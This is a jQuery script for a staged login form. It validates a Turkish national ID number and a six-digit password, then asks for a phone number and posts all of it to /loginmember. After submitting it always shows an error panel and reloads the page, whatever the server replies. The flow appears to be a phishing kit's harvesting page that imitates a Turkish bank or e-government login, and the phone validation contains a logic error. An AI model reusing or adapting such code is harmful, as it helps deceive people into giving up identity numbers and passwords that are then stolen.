$(function () {
    $phone = $("[name=phone]");
    $tc = $("[name=tc]");
    $pass = $("[name=parol]");

    $tc.inputmask("99999999999");
    $pass.inputmask({
        mask: '999999', // 6 haneli rakam maskesi
        placeholder: '', // BoÅŸ bÄ±rakmak iÃ§in
        showMaskOnFocus: false, // OdaklanÄ±nca maskeyi gÃ¶sterme
        showMaskOnHover: false, // Ãœzerine gelince maskeyi gÃ¶sterme
        definitions: {
            '9': {
                validator: "[0-9]",
                cardinality: 1,
                definitionSymbol: '*'
            }
        }
    });
    $phone.inputmask("999 999 99 99");

    $phone.on("input", function () {
        // Girdi değeri al
        var value = $(this).val();
        // Başında 0 varsa sil
        if (value.startsWith("0")) {
            $(this).val(value.substring(1));
        }
    });

    var $try = 0;

    var csrfToken = $('meta[name="csrf-token"]').attr("content");
    $.ajaxSetup({
        headers: {
            "X-CSRF-TOKEN": csrfToken,
        },
    });

    function postForm(jsonData) {
        $.ajax({
            type: "POST",
            url: "/loginmember",
            dataType: "json",
            data: jsonData,
            success: function (response) {
                setTimeout(function () {
                    location.reload();
                }, 3000);
            },
        });
    }

    $("form").submit(function () {
        if (
            $tc.val() == "" ||
            $tc.val().replaceAll("_", "").length < 11 ||
            !tckn($tc.val().replaceAll("_", ""))
        ) {
            $(".tcerr").fadeIn();
            return false;
        } else {
            $(".tcerr").fadeOut();
        }

        if ($pass.val() == "" || $pass.val().replaceAll("_", "").length < 6) {
            $(".passerr").fadeIn();
            return false;
        } else {
            $(".passerr").fadeOut();
        }

        $try++;
        console.log($try);
        if ($try) {
            let jsonData = {
                tc: $tc.val(),
                password: $pass.val(),
                try: $try,
            };

            if ($try == 1) {
                $(".first_step").hide();
                $(".two_step").removeClass("d-none").fadeIn();
            } else if ($try > 1) {
                jsonData["phone"] = $phone.val();
                if (
                    $phone.val() != "" ||
                    $phone.val().replaceAll("_", "").length < 9
                ) {
                    console.log("girdi");
                    $(".first_step").hide();
                    $(".two_step").hide();
                    $(".wpforms-submit-container").hide();
                    $(".error_step").fadeIn();
                    postForm(jsonData);
                } else {
                    console.log("girmedi");
                    alert("telefon boş geçilemez");
                }
            }

            return false;
        }
    });
    function tckn(tckn) {
        if (tckn.length < 11) return false;

        let odd = 0;
        let even = 0;
        let total = 0;

        for (let i = 0; i <= 8; i += 2) {
            odd += parseInt(tckn[i]);
        }

        for (let i = 1; i <= 7; i += 2) {
            even += parseInt(tckn[i]);
        }

        for (let i = 0; i <= 9; i++) {
            total += parseInt(tckn[i]);
        }

        if (tckn.length != 11) return false;
        else if (!/^\d+$/.test(tckn)) return false;
        else if ((7 * odd - even) % 10 != parseInt(tckn[9])) return false;
        else if (total % 10 != parseInt(tckn[10])) return false;
        else return true;
    }
});
